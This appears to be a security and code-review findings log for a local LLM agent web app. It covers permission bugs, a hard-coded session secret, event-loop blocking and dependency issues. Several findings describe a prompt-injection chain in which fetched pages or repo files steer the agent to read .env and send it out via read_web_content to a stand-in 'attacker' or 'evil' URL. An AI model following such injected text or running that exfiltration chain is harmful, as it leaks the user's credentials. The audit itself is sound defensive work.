A forged session also reaches read_files with no approval (RULES `auto`). That tool uses `_safe_path`, which allows reading the project-root .env that holds APP_LOGIN_PASSWORD. Calendar, notes, TTS and audio routes are open too. For a single-user app this is reachable from the LAN only through the 0.0.0.0 launchers, because the README/CLAUDE.md `uvicorn core.ui:app --reload` defaults to 127.0.0.1. Since those launchers are the user's normal way of starting the app, high severity is justified.
findings.status_note:
The secret is fixed. The desktop launchers still bind to 0.0.0.0.

Originally reported as: Session secret is hard-coded to "THIS_SECRET" while the UI launchers bind to 0.0.0.0

findings.title: Permission approval is tied to the action name only; it ignores args, re-runs approved tools, and loops forever on a second approval
findings.detail: permission_card.html:23-24 posts permission_args and permission_risk, but create_permission_decisions reads only permission_action and permission_decision, so those two fields are never used. After an approval, /ask re-runs the whole task from scratch with decisions={action: True}, which causes three problems. (1) The LLM decides again, and any args it now picks for that action are auto-approved, even if they differ from what the user saw. (2) Tools approved in earlier rounds run again, so side effects repeat. (3) A task that needs two different approvals never finishes. I simulated this with a deterministic fake LLM doing write_file then edit_file. Round 1 asks for write_file. Round 2 runs write_file, then asks for edit_file. Round 3 uses decisions={edit_file: True}, so it asks for write_file again. The rounds keep alternating, and write_file had already run twice by round 3.
findings.suggestion: Bind each approval to a signature, action plus canonical JSON of the args (agent.py already builds that string at line 276). Only auto-approve when the signature matches. Accumulate approved signatures across rounds, for example as a hidden JSON list field or in the session. Better still, resume the saved context instead of replaying the task from step 0.
findings.verification_note:
I traced the code and reproduced the bug. core/agent_routes.py:27-34 builds `{permission_action: decision == "y"}` and nothing else. A grep shows `permission_args` and `permission_risk` (templates/components/permission_card.html:23-24, filled by static/chat.js:52-53) are posted but never read anywhere. The streamed flow also posts its approval through this plain form to /ask (chat.js does not intercept the permission form), so both paths go through `create_permission_decisions`. core/permission.py:25-27 then approves on `action in decisions` alone, and /ask (agent_routes.py:116-119) re-runs `run_agent` from step 0 with a fresh `context` and `attempted` set, so nothing from the earlier round is carried over.

Read-only reproduction: I used a fake `query_llm`, stubbed `write_file`/`edit_file` and `log_event` so nothing was written, and fed each PermissionRequired back through the real `create_permission_decisions`.
- Round 1, `{}`: asks for write_file.
- Round 2, `{write_file: True}`: runs write_file, then asks for edit_file.
- Round 3, `{edit_file: True}`: asks for write_file again. edit_file is never reached.
- Round 4: write_file runs a second time and edit_file is asked for again.
- This alternated indefinitely, through 6 rounds. The task never finishes.

A second run showed the args problem. With `{write_file: True}`, approving `notes/a.txt` also auto-approved a later write_file of `core/ui.py` with different content in the same run. So the approval covers any args for that action, both within a run and on the replay.

Extra consequences I checked:
- `_backup_and_write` (tools/files.py:329-335) overwrites `<path>.bak`. A replayed write_file therefore replaces the original backup with the output of the first write, and the real original is lost.
- `planned_first_decision` (agent.py:94-108) always re-proposes extract_inline_scripts (rule "ask") at step 0. Any script-refactor request whose follow-up needs a different ask-tool, such as edit_file, gets into the loop without the LLM having to repeat itself.

Tests do not cover this. tests/test_agent_flow.py:106-137 only tests a single approval round.

One small correction to the finding: write_file had run once, not twice, by round 3. Round 3 asks for write_file again instead of running it. The second execution happens in round 4. The mechanism, impact and suggested fix (bind approval to the action:canonical-args signature from agent.py:276, keep approved signatures across rounds, or resume the saved context) are correct. This is a design change (the form fields, the decisions contract, and possibly session state).
findings.status_note: A run that needs approval is now stored on the server under a single-use run id (core/runs.py), owned by the login session. The card sends only that id, and resuming runs exactly the stored call, then continues the same run. Tests cover a two-approval run, approval tied to arguments, single use and session ownership.

findings.title: /speech runs Whisper on the event loop and freezes the server
findings.detail: event_stream is an `async def` generator that iterates the synchronous stream_agent. Starlette consumes async iterators directly on the event loop, so every requests.post to Ollama blocks the whole server: OLLAMA_TIMEOUT is 600s and qwen3-coder:30b on CPU takes minutes. /ask (async def, line 79) calls run_agent synchronously, and /speech (core/speech_routes.py:14) calls transcribe_audio synchronously. While the agent is thinking, every other request hangs: /static files, /calendar/month next/prev, /tts/*. The audio routes already use run_in_threadpool, so the codebase is inconsistent here.
findings.suggestion: Make event_stream a plain sync generator; Starlette then iterates it in a threadpool. Wrap run_agent and transcribe_audio in `await run_in_threadpool(...)`, as features/audio/routes.py already does.
findings.verification_note:
I traced the code and the bug is real.
- core/agent_routes.py:191-193 defines `async def event_stream()`, which runs `for message in stream_agent(user_input)` synchronously.
- stream_agent (agent.py:374) is a plain sync generator over _run_steps. That calls try_local_answer and `query_llm(..., model=OLLAMA_CODE_MODEL)` (agent.py:226).
- query_llm does a blocking `requests.post(..., timeout=OLLAMA_TIMEOUT)` (core/llm.py:38), and OLLAMA_TIMEOUT defaults to 600 (core/llm.py:24).
- In the installed Starlette 1.6.0, StreamingResponse.__init__ keeps an AsyncIterable as-is and only wraps sync iterables in iterate_in_threadpool. stream_response then runs `async for chunk in self.body_iterator` on the event loop. So each next() on the async generator runs the blocking LLM call on the loop.
- /ask (async def, line 79-80) calls `run_agent(...)` directly at line 119.
- /speech (core/speech_routes.py:13-14, async def) calls `transcribe_audio(temp_path)` directly at line 20, which is a faster-whisper CPU transcription.
- features/audio/routes.py imports run_in_threadpool (line 11) and uses it at lines 72, 98, 123 and 145, so the inconsistency claim is accurate.
- Nothing guards against this. README and CLAUDE.md run a single uvicorn worker, and no test exercises concurrency.

I demonstrated it read-only by importing the real app, overriding is_logged_in, and monkeypatching agent.query_llm to `time.sleep(2)`. Through httpx ASGITransport, a GET /calendar/month sent 0.2s after a POST /ask_stream did not finish until 2.02s. The same GET sent alongside POST /ask finished at 2.22s.

For a control, I added an in-memory route that uses the suggested fix, a plain sync generator over stream_agent. The concurrent /calendar/month then finished at 0.22s while the stream still took 2.01s. That confirms both the mechanism and the fix.

All file paths and line numbers in the finding are accurate. Medium severity fits this single-user local app: while the model runs (it can take minutes on CPU), every other request stalls, including static files, calendar navigation and TTS. The fix changes no cross-file contract (is_design_change=false).
findings.status_note:
/ask and /ask_stream now run the agent in a worker thread. /speech still runs Whisper on the event loop.

Originally reported as: /ask_stream, /ask and /speech run blocking LLM and Whisper calls on the event loop

findings.title: Registry flag "external": 1 is never read; web tools are auto-approved, which contradicts the system prompt
findings.detail: "external" is set on get_news, search_web and read_web_content (lines 42, 48, 54). Nothing in the repo reads it; git grep finds no consumer, and build_tool_prompt and request_permission ignore it. Meanwhile config/settings.py:7-8 sets search_web and get_news to "auto". So outbound network calls happen with no prompt, even though config/system_prompt.py:18 tells the model 'External access (web, email, calendar) requires permission' and README says 'Permission-gated tools (safe by default)'. The flag clearly had a purpose, such as an offline mode or always-ask for external tools, that was never wired in.
findings.suggestion: Decide, don't delete silently. Option A: add e.g. ALLOW_EXTERNAL_TOOLS / OFFLINE in config/settings.py. When it is off, build_tool_prompt hides external tools and _run_steps refuses them; when it is on, external tools default to 'ask' unless RULES says otherwise. Option B: drop the key and fix the system-prompt sentence to match RULES.
findings.verification_note:
The core claim holds. The `"external": 1` key at tools/registry.py:42, 48 and 54 has no reader anywhere in the working tree. A grep of agent.py, core/, features/, tools/, config/, static/ and templates/ finds only the three registry lines. build_tool_prompt (agent.py:131-137) reads only `description`. execute_tool (agent.py:121-128) reads only `func`. _run_steps passes only `tool["risk"]` to request_permission (agent.py:289). core/permission.py:14-38 looks only at RULES and risk. The finding is overstated in two places.

1. Not every web tool is auto-approved. search_web and get_news are set to "auto" in RULES (config/settings.py:7-8). get_news would be auto-approved without that rule, because its risk is "low". read_web_content has no RULES entry and risk "medium", so request_permission still asks for it. So outbound fetches of arbitrary URLs do prompt; searches and news calls do not.

2. The suggested origin ("offline mode / always-ask") is a guess. Git history shows the key did have a consumer. Commits 9a5e5b4 and 827a30e added `"external": TOOLS.get(pr.action, {}).get("external", False)` to the permission_required payload in core/ui.py and agent.py. Commit 3f29418 ("slimmed, refactored and fixed tools") removed it and left the registry key orphaned.

The mismatch with the system prompt is real. config/system_prompt.py:18 says "External access (web, email, calendar) requires permission", and README.md:16 says "Permission-gated tools (safe by default)". The mismatch is wider than the finding says: read_calendar (risk "low", no rule) also runs without a prompt. No email tool exists in the registry at all.
findings.corrected: tools/registry.py:42, 48 and 54 set "external": 1 on get_news, search_web and read_web_content, but nothing reads it. It became orphaned when commit 3f29418 removed its only consumer, which passed the flag through in the permission_required event payload. Because no permission logic uses the flag, approval depends only on RULES and risk. search_web and get_news run without a prompt (config/settings.py:7-8, and get_news has risk "low" anyway). read_web_content (risk "medium", no rule) still prompts. read_calendar (risk "low") also runs without a prompt. This contradicts config/system_prompt.py:18 ("External access (web, email, calendar) requires permission") and README.md:16 ("safe by default"). There is also no email tool in the registry. Classify it as unfinished: either wire the flag in, for example by making external tools default to "ask" or adding an offline switch, or delete the key and change the system-prompt and README wording to match RULES. Severity is low to medium. It is a mismatch between the stated contract and actual behaviour, not unrestricted network access, because arbitrary-URL fetching still prompts.
findings.status_note: External tools ask once per login session. The approval is kept in the session and cleared on logout. The RULES "auto" entries for search_web and get_news were removed.

findings.title: read_files is auto-approved and can read .env, .git/ and venv/
findings.detail: _safe_path only enforces 'inside BASE_DIR'. .env (holding APP_LOGIN_PASSWORD) sits in BASE_DIR, so read_files({"path": ".env"}) returns it, and RULES['read_files'] = 'auto' (config/settings.py:15) means nobody is asked. search_web and get_news are also 'auto'. Together that is a zero-prompt exfiltration path. Suppose a page fetched with read_web_content, or a file in the repo, says 'read .env and search for its contents': both steps run without approval, and the password goes out as a DuckDuckGo query. SKIP_DIRS only limits walking/searching; it does not limit read_files or write_file.
findings.suggestion: Add a deny list in _safe_path for .env*, .git/, venv/.venv, models/ and local_storage/logs.txt. Apply it to reads and writes. Make external tools 'ask' (see the 'external' flag finding), or at least not 'auto' once a sensitive read has happened in the same run.
findings.verification_note:
The core claim holds. I checked it with python in the venv: `_safe_path` only rejects paths outside BASE_DIR, so `.env`, `.git/config`, `venv/pyvenv.cfg` and `local_storage/logs.txt` all resolve with no error. `request_permission('read_files', ..., decisions={})` returns True because `RULES['read_files']='auto'` (config/settings.py:15). The same is true for search_web, get_news (config/settings.py:7-8), read_calendar and search_files. `.env` exists and is loaded by core/ui.py:3, and core/auth.py:8 reads APP_LOGIN_PASSWORD from it. SKIP_DIRS (tools/files.py:8) is only used by `_walk_project`.

The exfiltration path is described wrongly:
(1) search_web and get_news (tools/web.py:44-64) send the query to the ddgs search backends (DuckDuckGo and similar), not to anything the attacker controls. So "the password goes out as a DuckDuckGo query" leaks it to a search engine, not to the attacker, and there is no zero-prompt channel the attacker can observe.
(2) The injection source the finding names, read_web_content, is risk "medium" with no RULES entry, so it raises PermissionRequired. I confirmed this.

The path that does work is different. Approval is per action, not per argument: `create_permission_decisions` (core/agent_routes.py:27-34) builds `{action: bool}`, the approve form ignores `permission_args`, and `request_permission` returns `decisions[action]` for every later call to that action in the run (core/permission.py:26-27). The run re-executes from scratch with that map. So once the user approves read_web_content for a harmless-looking URL, the fetched page can inject: read_files(".env") runs automatically, then read_web_content(["https://evil/?p=<secret>"]) runs under the approval already given. The 5s rate limit in tools/web.py:70 does not stop this, because local LLM steps take longer than that. Prompts can also be injected with zero approvals through search_web/get_news snippets or repo files, since those are auto-approved. Getting data back to the attacker still needs that one read_web_content approval.

Severity in context: who can reach the agent is limited to an authenticated web session (agent_router uses `Depends(is_logged_in)`) or the CLI, and uvicorn binds to 127.0.0.1 by default. The leaked login password is also worth little, because core/ui.py:34 hardcodes `SessionMiddleware(secret_key="THIS_SECRET")`. Anyone who can reach the server can forge an `authenticated=True` session cookie without knowing the password. Side effect: agent.py:317-323 logs the first 500 characters of each tool result, so .env contents would also be written to local_storage/logs.txt. Writes to .env/.git are already gated, because write_file, edit_file and extract_inline_scripts are 'ask'. A deny-list for writes would therefore be defense in depth only.
findings.corrected:
read_files is auto-approved (config/settings.py:15). `_safe_path` (tools/files.py:14-25) only blocks paths that escape BASE_DIR, so the LLM can read .env (APP_LOGIN_PASSWORD), .git/, venv/ and local_storage/logs.txt without any prompt. SKIP_DIRS only applies to walk/search. The contents go into the LLM context, the UI response, and logs.txt (agent.py:317-323 logs result[:500]).

There is no fully zero-prompt exfiltration to an attacker. The auto-approved outbound tools (search_web, get_news) only send queries to search-engine backends. Real exfiltration needs read_web_content, which asks for approval. But that approval is scoped to the action, not its arguments: core/agent_routes.py:27-34 builds {action: bool}, and core/permission.py:26-27 applies it to every later call in the re-run. So approving one harmless read_web_content URL lets injected page content (or an injection from auto-approved search snippets or repo files) chain read_files('.env') and then read_web_content(['https://attacker/?p=<secret>']) with no further prompt.

Severity is low-medium for this localhost single-user app. The login password matters little here, because core/ui.py:34 hardcodes SessionMiddleware secret_key='THIS_SECRET', which already allows session forging by anyone who can reach the server.

Fixes:
- Add a sensitive-path deny-list in `_safe_path` (.env*, .git/, venv/, .venv/, models/, local_storage/logs.txt).
- Bind permission approvals to action plus arguments (or a single tool-call id) instead of to the action name.
- Optionally make external tools 'ask' once a sensitive read has happened in the same run.
findings.status_note: tools/files.py now refuses .env*, keys, credentials, .git/, the event log and the conversation database, and search/listing skip them. venv/ is still readable by name.

findings.title: get_news shares a rate limit with search_web and uses a fragile text search
findings.detail: (a) The signature is get_news(country), with country required. The registry description 'Get latest news headlines' does not mention it, so the model either calls with {} or {"query": ...}, and both raise TypeError (verified). (b) It is listed to the model, but logs show 0 of ~1,366 LLM decisions chose it; the model uses search_web for news. (c) It calls rate_limit('get_news') and then search_web, which calls rate_limit('search_web'). If search_web ran within the last 5s, get_news returns 'Rate limit exceeded' even though get_news itself was never called. The query is a text search with 'site:a OR site:b' and a year appended, not a news search.
findings.suggestion: Either finish it or remove it. A web news search fits local-first, since DuckDuckGo is not an AI API. To finish it: make the arguments optional (query=None, country=None), use DDGS().news(query, max_results=MAX_RESULTS) (the installed ddgs 9.16 has .news), give it its own rate-limit key without calling search_web, and name the parameters in the description. Otherwise remove the registry and RULES entries; search_web already covers the README's 'news in Brazil' example.
findings.verification_note:
I checked each claim against the code and the logs.

Wiring: get_news is wired in tools/registry.py:38-43, with the func "tools.web.get_news", the description "Get latest news headlines", risk low and external. It also has a RULES entry at config/settings.py:8 ("auto"). It is listed to the model through agent.py:131-137 (build_tool_prompt). No other code calls it, and no test covers it; grepping tests/ finds nothing.

(a) The signature is `def get_news(country)` at tools/web.py:59, and the description never names the "country" argument. Every other tool that takes arguments names them in its description (edit_file, extract_inline_scripts), or says it takes none (verify_app). agent.py:121-128 runs the tool as `func(**args)`, with args taken from decision_args, which returns {} when no argument dict is present. I ran it in the venv: get_news(**{}) raises "missing 1 required positional argument: 'country'", and get_news(query='brazil') raises "unexpected keyword argument 'query'". execute_tool is not wrapped in a try/except inside _run_steps, so this TypeError would escape the loop.

(b) local_storage/logs.txt now has 1400 llm_raw_decision lines (the reviewer's ~1,366 came from an earlier, smaller log). None of them chose get_news. The only line that mentions get_news is line 399, where the model echoes the tool list in a hallucinated error. Of the 333 tool_execution entries, none is get_news, while search_web has 93.

(c) tools/web.py:60 calls rate_limit('get_news'), and line 64 then calls search_web(query), which calls rate_limit('search_web') at line 45. If search_web ran less than 5s earlier (COOL_DOWN=5, lines 67-76), get_news returns "Rate limit exceeded" even though it had not been called itself. It also uses up search_web's cooldown for the next call. The query at line 63 is a plain ddgs.text search, with "site:... OR site:..." and the current year appended.

The suggestion holds up too. The installed ddgs is 9.16.0, and hasattr(DDGS, 'news') is True. The README example "What is in the news in Brazil?" (README.md:129) is already handled by search_web, as the logs show. "Can't be called correctly" is slightly loose, since a call with {"country": ...} would work, but the model is never told that argument exists. Medium severity and the "unfinished" classification fit.
findings.status_note:
The schema now names the required country argument. Still open: the rate limit shared with search_web, and the site:-OR text search.

Originally reported as: get_news can't be called correctly and has never been chosen

findings.title: Notes can be saved but never read back, and the CLI can't save them
findings.detail: tools/notes.py is not in tools/registry.py. Saving is reachable only through regex shortcuts in core/agent_routes.py:44-47 (/ask, /ask_stream) and core/speech_routes.py:21-24 (/speech). agent._run_steps has no notes shortcut, unlike calendar and play, so in `python -m agent` 'note buy milk' goes to the LLM and nothing is saved. No tool or route lists or reads notes, yet README lists 'notes' as a feature. The only way back in is read_files on local_storage/note_*.txt, which the model doesn't know about. File names have one-second resolution (note_%Y%m%d_%H%M%S.txt), so two notes saved in the same second overwrite each other.
findings.suggestion: Register low-risk save_note(text) and list_notes(query=None)/read_note(name) tools. Move the parse_note_command shortcut into _run_steps next to the calendar and play shortcuts so CLI and web behave the same. Add microseconds or a counter to the file name.
findings.verification_note:
The main claims hold up when checked against the code:
- tools/registry.py has no notes entry.
- The note helpers are imported only by the shortcut handlers: parse_note_command/save_note_text are used in core/agent_routes.py:18,44-47 (shortcut_text_response, called from /ask at line 91 and /ask_stream at line 164) and in core/speech_routes.py:8,21-24.
- agent.py::_run_steps (lines 163-188) has shortcuts for script-refactor, calendar-create (174-177) and play (184-187), but none for notes. run_agent and the `__main__` CLI loop (agent.py:344-418) go straight to _run_steps, so in CLI mode 'note buy milk' is sent to the LLM and nothing is saved.
- No function, route or registry entry lists or reads notes, and config/ (the system prompt) never mentions notes.
- README.md:9 and README.md:17 still list 'notes' as a tool/feature.
- save_note_text (tools/notes.py:34-38) names files with strftime('%Y%m%d_%H%M%S') and opens them with mode 'w'. Two saves in the same second therefore silently overwrite each other.
- The notes module has no tests. The 'notes' matches in tests/ are only notes.txt fixture filenames.

One detail is overstated. Notes are not reachable only through read_files. local_storage is not in tools/files.py SKIP_DIRS (line 8), so get_project_structure lists local_storage/note_*.txt. search_files also matches note contents, so a search for 'milk' returns the note file. The model can find notes through the generic file tools (both medium risk). There is still no dedicated notes reader, and nothing tells the model that notes live there.

There is also a related bug the reviewer missed. static/speech.js:40-42 ignores the `note_saved` field returned by /speech. It writes the transcript ('note buy milk') into the input box with no confirmation, so the user cannot tell the note was already saved. If they then press send, /ask_stream runs shortcut_text_response again and saves a second copy, now with source='text'.
findings.corrected:
Notes are only half-wired (UNFINISHED, medium). tools/notes.py (save_note_text, line 32) is not in tools/registry.py. Saving happens only through regex shortcuts in core/agent_routes.py:44-47 (/ask and /ask_stream) and core/speech_routes.py:21-24 (/speech).

agent.py::_run_steps (163-188) has calendar and play shortcuts but no notes shortcut, so `python -m agent` sends 'note buy milk' to the LLM and nothing is saved.

No tool, route or prompt lists or reads notes, yet README.md:9 and README.md:17 advertise notes. The model can reach them only incidentally: local_storage is not in SKIP_DIRS (tools/files.py:8), so get_project_structure lists note files and search_files matches their contents. The model is never told that notes exist.

File names use one-second resolution (note_%Y%m%d_%H%M%S.txt) and are written with mode 'w', so two saves in the same second overwrite each other.

Related bug: static/speech.js:40-42 ignores /speech's `note_saved` field. The note is saved silently and 'note ...' is left in the input box. Submitting it then saves a duplicate through /ask_stream.

The notes module has no tests.

Suggested fixes:
- Register low-risk save_note and list_notes/read_note tools.
- Move the parse_note_command shortcut into _run_steps next to the calendar and play shortcuts.
- Make file names unique (microseconds or a counter, or open with mode 'x').
- Either show `note_saved` in speech.js and clear the input box, or stop saving in /speech and let /ask handle it.
findings.status_note: save_note and list_notes are registered tools, so the LLM can save and find notes in both the CLI and the web. File names include microseconds.

findings.title: read_email is a stub, but both prompts tell the model email is available
findings.detail: read_email raises NotImplementedError and nothing references it; it is not in the registry. LOCAL_ONLY_PROMPT (agent.py:35) lists 'email' as a reason to escalate to tools, and SYSTEM_PROMPT (config/system_prompt.py:18) says 'External access (web, email, calendar) requires permission'. 'check my email' therefore escalates to the 30B tool loop, where no email tool exists. The likely outcome is a hallucinated action, two unknown-action retries, then 'Unknown action', after several slow LLM calls.
findings.suggestion: Remove the email mentions from both prompts now. Keep the stub only if a mailbox reader is actually planned: read-only IMAP via stdlib imaplib, credentials in .env, external, risk medium, never 'auto', and email bodies treated as untrusted input because of prompt injection. Otherwise delete tools/email.py.
findings.verification_note:
I checked each claim against the code and they hold.

1. tools/email.py:5-6 defines read_email(), which only raises NotImplementedError. The comment at lines 1-2 says it is "Not implemented yet, and not registered in tools/registry.py - wire it up there once read_email() actually talks to a mailbox." That makes it an intentional placeholder, so "unfinished" is the right label rather than "dead".
2. Nothing uses it. A repo-wide grep for "email" in .py, .html, .js and .md files (venv excluded) turns up only the stub itself, agent.py:35, config/system_prompt.py:18, and two unrelated TTS hits (an email-address test and a comment). tools/registry.py has no email entry, and the stub has a single commit (3f29418).
3. Both prompts mention email. agent.py:35 (LOCAL_ONLY_PROMPT) says "If you cannot answer without a tool (web search, reading/writing files, email, calendar, etc.)", returning needs_tools. config/system_prompt.py:18 says "External access (web, email, calendar) requires permission".
4. The escalation path is real. In the venv, "check my email" returns False/None from is_calendar_request, parse_create_command, parse_play_command, parse_note_command and needs_tools. So none of the shortcuts in core/agent_routes.py or agent.py::_run_steps catch it. It goes to try_local_answer (qwen3:8b, core/llm.py:11), which the prompt tells to answer needs_tools for email. That leads to the tool loop on OLLAMA_CODE_MODEL (qwen3-coder:30b, core/llm.py:16), and build_tool_prompt() lists no email tool there.
5. The unknown-action handling matches the finding (agent.py:205 and 257-271): two corrective retries, then an "Unknown action: X" error event.

One caveat: the end result is not fixed. With the tool list and the "There is no tool called..." correction in front of it, the 30B model may instead return action "none" with a "can't access email" reply. Either way, an email request costs at least one 8B call and one or more 30B calls before the user hears it is unsupported, and a hallucinated read_email may end in the "Unknown action" error. The finding words this as "likely", which is fair. Low severity is appropriate.
findings.status_note: Neither prompt mentions email any more.

findings.title: Web app needs an X display, PortAudio and an eagerly loaded Whisper model because of CLI-only imports
findings.detail: pynput (needs X; CI runs xvfb only for this, per tests.yml:35) and sounddevice (needs libportaudio) are imported at module top (lines 3-4), and WhisperModel('base') is built at import (line 9). That contradicts CLAUDE.md's rule that models load lazily on first use. agent.py:6 imports `listen` at top level only for its __main__ CLI, and core/speech_routes imports this module too. So `uvicorn core.ui:app` on a headless or Wayland-only box fails at import, and every test or web start pays the Whisper load. Smaller issues: the `global recording, audio_buffer` at line 41 is unneeded because those names are only read (pyflakes), and the transcript is printed twice (lines 66 and 75). scipy is used only for wavfile.write here, which soundfile (already a dependency) can do.
findings.suggestion: Load the model lazily (a module-level None plus a _get_model() helper used by transcribe_audio). Import pynput, sounddevice and the WAV writer inside record_push_to_talk. Import listen inside agent.py's __main__ block. Swap scipy.io.wavfile.write for soundfile.write and drop scipy from requirements.
findings.verification_note:
I checked every part of the premise.
- core/speech_to_text.py imports pynput.keyboard (line 3) and sounddevice (line 4) at module top, and builds WhisperModel("base", device="cpu", compute_type="int8") at import (line 9).
- core/ui.py:12 imports core.speech_routes, and core/speech_routes.py:6 imports transcribe_audio from this module. So the web app pulls in all three at startup.
- agent.py:6 imports `listen` at top level, but only uses it in the `__main__` CLI loop (line 393). core/agent_routes.py:6 imports agent, which is a second path from the web app to this module.
- I reproduced the failure. With DISPLAY and WAYLAND_DISPLAY unset, both `python -c "import pynput.keyboard"` and `python -c "import core.ui"` fail with "ImportError: this platform is not supported: failed to acquire X connection". A box that runs XWayland still has DISPLAY set and would work, so the failure is specific to Wayland without XWayland, or no display at all.
- .github/workflows/tests.yml says this itself: lines 34-35 note "sounddevice needs [libportaudio2] at import time" and "pynput refuses to import without an X display", line 58 wraps pytest in xvfb-run, and lines 49-50 say "core/speech_to_text.py loads the Whisper 'base' model at import time ... cache it".
- That conflicts with CLAUDE.md's rule that model weights are "fetched lazily on first use, not at import time — don't ... make startup depend on them". Whisper downloads into the Hugging Face cache rather than models/, but it is the same rule.
- With the model already cached, importing the module took about 0.69s wall time, with roughly 0.26s self time spent in the module (python -X importtime). On a cold start it downloads the model at import.
- Smaller points:
  - pyflakes flags the `global recording, audio_buffer` at line 41 as unused. That is correct: the function only reads `recording` and calls `.append` on `audio_buffer`, never reassigning either.
  - The CLI prints the transcript twice: once in transcribe_audio (line 66) and again in listen (line 75).
  - scipy is used only at core/speech_to_text.py:1 (`wavfile.write`). `pip show scipy` reports "Required-by:" as empty, and soundfile==0.14.0 is already in requirements.txt (line 55) and used in features/audio/text_to_speech.py.
- The suggested fixes are safe. No test references `listen` or `transcribe_audio`. on_press and on_release only use `key.char`, so moving the pynput import inside record_push_to_talk breaks nothing. The /speech route calls transcribe_audio, which would load the model on first use through a getter.
- One small caveat on swapping in soundfile.write: for WAV it writes 16-bit PCM by default, where scipy writes the float32 data as-is. Whisper handles either.

findings.title: evdev and python-xlib are pinned for every platform, which breaks the documented Windows install
findings.detail: pynput declares `evdev>=1.3; "linux" in sys_platform` and `python-xlib>=0.17; "linux" in sys_platform`. requirements.txt pins evdev==2.0.0 (line 13) and python-xlib==0.33 (line 49) unconditionally. evdev is Linux-only and fails to build elsewhere, so `pip install -r requirements.txt` on Windows aborts, even though README documents Windows setup and desktop/*.bat launchers exist.
findings.suggestion: Add markers: `evdev==2.0.0; sys_platform == "linux"` and `python-xlib==0.33; sys_platform == "linux"`.
findings.verification_note: I checked each part of the claim. requirements.txt pins `evdev==2.0.0` at line 13 and `python-xlib==0.33` at line 49, with no environment markers. pynput 1.8.2 is pinned at line 43 and imported in core/speech_to_text.py:3. Its metadata from importlib.metadata.requires lists both packages only for Linux: `evdev>=1.3; "linux" in sys_platform` and `python-xlib>=0.17; "linux" in sys_platform`. evdev 2.0.0 is not available as a Windows wheel: `pip download evdev==2.0.0 --only-binary :all: --platform win_amd64` returns "No matching distribution". So on Windows pip has to build it from the sdist. That build fails because evdev's setup.py looks for linux/input.h, linux/input-event-codes.h and linux/uinput.h under /usr/include, and its classifiers declare "Operating System :: POSIX :: Linux". Windows is a documented setup path: README.md lines 42-43 give the venv activation commands and line 64 has a ".bat shortcut" section. desktop/start_agent.bat and desktop/start_agent_ui.bat also exist. Following those steps on Windows, `pip install -r requirements.txt` stops at evdev. One correction to the detail: python-xlib is a pure-Python wheel (python_xlib-0.33-py2.py3-none-any.whl) and downloads for win_amd64 without problems. Only evdev breaks the install. The python-xlib marker just avoids an unneeded dependency. The suggested markers match pynput's own conditions and would not affect Linux installs.

findings.title: requirements.txt contains dead pins and is a partial freeze
findings.detail: I checked every pin against imports and against reverse dependencies of what is installed. httpx2 (line 23) is never imported and no installed package requires it: dead. pyflakes (line 41) is a dev linter, never imported and not run in CI; this is dev tooling and it has been left half-wired. Needed although never imported, so keep them: uvicorn (run command), python-multipart (request.form()/Form/UploadFile), itsdangerous (SessionMiddleware), Jinja2. The file pins many transitive packages (anyio, h11, pydantic_core, MarkupSafe...) but leaves out others that are required: onnxruntime (faster-whisper), transformers, misaki, loguru (kokoro), sympy and networkx (torch). So it is neither a minimal list nor a reproducible lock. hf-xet is pinned but not installed in the current venv, so the venv has drifted from the file. vulture is installed but not listed.
findings.suggestion: Remove httpx2. Move pytest, pyflakes and vulture into requirements-dev.txt, or add a pyflakes step to tests.yml. Consider a short requirements.in of direct dependencies plus a generated lock file (pip-compile).
findings.verification_note:
The main claim, that httpx2 at requirements.txt:23 is dead, is wrong. The tests import TestClient from fastapi.testclient (tests/test_agent_flow.py:8, tests/test_calendar.py:6, tests/test_speech_routes.py:3), and that is a re-export of starlette.testclient. In the pinned starlette 1.6.0, venv/lib/python3.12/site-packages/starlette/testclient.py:33-51 runs `import httpx2 as httpx` first. It falls back to plain httpx only when httpx2 is missing, and then raises a StarletteDeprecationWarning ("Using `httpx` with `starlette.testclient` is deprecated; install `httpx2` instead"). I confirmed that at runtime starlette.testclient.httpx.__name__ is 'httpx2'. Starlette's 'full' extra also lists httpx2>=2.0.0, so "no installed package requires it" is also wrong. httpx2 was added in commit 3292852, after the original freeze, which fits a deliberate pin to the backend Starlette prefers. So httpx2 is a test dependency CI uses on every run. Removing it would not break the tests but would bring the deprecation warning back.

The rest of the finding holds up:
- pyflakes (line 41) is never imported and is not run in .github/workflows/tests.yml, which runs only pytest.
- vulture 2.16 is installed but not listed.
- The file pins transitive packages (anyio, h11, pydantic_core, MarkupSafe) but leaves out required ones: onnxruntime (needed by faster-whisper; pinned in 3f29418 and dropped in 79c96ed), transformers, misaki and loguru (kokoro), sympy and networkx (torch), and httpcore2 and truststore (httpx2).
- hf-xet is pinned but missing from the venv. It is a hard requirement of huggingface_hub on x86_64, and `pip check` reports "huggingface-hub 1.29.0 requires hf-xet, which is not installed". So the pin is correct and the venv is the part that is broken.

Severity is low. This is packaging hygiene, not dead code.
findings.corrected:
requirements.txt is an inconsistent partial `pip freeze`, not a minimal list and not a reproducible lock. It is also not dead code. There are 5 problems:

1. It pins some transitive packages (anyio, h11, pydantic_core, MarkupSafe, ...) but leaves out others that are required: onnxruntime (needed by faster-whisper; pinned in commit 3f29418 and dropped in 79c96ed), transformers, misaki and loguru (kokoro), sympy and networkx (torch), and httpcore2 and truststore (httpx2).
2. Dev and test tools are mixed with runtime dependencies. pytest is listed, and so is pyflakes (line 41), which nothing imports and CI never runs. vulture is installed but not listed.
3. The local venv has drifted from the file. hf-xet is pinned at line 20 but not installed, even though huggingface_hub requires it on x86_64 (`pip check` flags this). Fix the venv, not the file.
4. httpx2 at line 23 is NOT dead. The tests use fastapi.testclient.TestClient, which comes from starlette.testclient. In starlette 1.6.0, that module runs `import httpx2 as httpx` first and falls back to httpx with a StarletteDeprecationWarning. Keep httpx2 and move it to the test/dev dependencies.
5. Suggested fix: put pytest, httpx2, pyflakes and vulture in requirements-dev.txt, or add a pyflakes step to tests.yml. Generate the runtime pins from a short requirements.in of direct dependencies (for example with pip-compile).

findings.title: LLM token streaming (query_llm(stream=True)) is implemented but only tests use it
findings.detail: _stream_llm_response (lines 47-61) is called only from tests/test_llm.py:44. /ask_stream streams status events only, never model tokens. The GeneratorType branch in core/streaming.py:11-12 exists for the same unused path; no event ever carries a generator. _stream_llm_response also hard-codes timeout=120 instead of OLLAMA_TIMEOUT (600), so it would time out on the CPU tool-loop model.
